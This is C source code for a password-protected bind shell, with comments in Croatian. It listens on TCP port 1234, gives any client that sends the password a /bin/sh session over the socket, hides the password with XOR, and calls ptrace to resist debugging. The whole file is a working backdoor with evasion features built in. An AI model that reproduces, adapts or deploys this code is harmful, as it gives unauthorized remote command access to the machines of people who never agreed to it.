#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ptrace.h>
#include "xor_string.h"

// the password to login to the shell
static const char pass[] = p;

/**
 * Returns true if provided password is equal to provided password
 * @param password
 * @return
 */
bool check_password(const char *password) {
    char p_pass[65] = {};
    XOR_STRING63(p_pass, pass, 0xaa);
    return memcmp(undo_xor_string(p_pass, sizeof(pass) - 1, 0xaa), password, sizeof(pass) - 1) != 0;
}

/**
* Ovaj program stvara jednostavni bind-shell.
*
*/
int main(int p_argc, char *p_argv[]) {
    (void) p_argc;
    (void) p_argv;
    int sock;

    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) != 0) {
        exit(EXIT_FAILURE);
    }
    
    if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        return EXIT_FAILURE;
    }

    struct sockaddr_in bind_addr = {};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = htonl(INADDR_ANY); //ovdje ide adresa napadaca
    bind_addr.sin_port = htons(1234);
    int bind_result = bind(sock, (struct sockaddr *) &bind_addr,
                           sizeof(bind_addr));
    if (bind_result != 0) {
        perror("Bind call failed");
        return EXIT_FAILURE;
    }
    int listen_result = listen(sock, 1);
    if (listen_result != 0) {
        return EXIT_FAILURE;
    }
    while (true) {
        int client_sock = accept(sock, NULL, NULL);
        if (client_sock < 0) {
            perror("Accept call failed");
            return EXIT_FAILURE;
        }

        int child_pid = fork();

        if (child_pid == 0) {
// read in the password
            char out[13] = "Upisi sifru:";
            write(client_sock, out, sizeof(out));

            char password_input[sizeof(pass)] = {0};
            int read_result = (int) read(client_sock, password_input,
                                         sizeof(password_input));
            if (read_result < (int) (sizeof(pass) - 1)) {
                close(client_sock);
                return EXIT_FAILURE;
            }

            if (check_password(password_input)) {
                close(client_sock);
                return EXIT_FAILURE;
            }
            dup2(client_sock, 0);
            dup2(client_sock, 1);
            dup2(client_sock, 2);
            execve("/bin/sh", (char *[]) {NULL}, (char *[]) {NULL});
            close(client_sock);
            return EXIT_SUCCESS;
        }
        close(client_sock);
    }
}
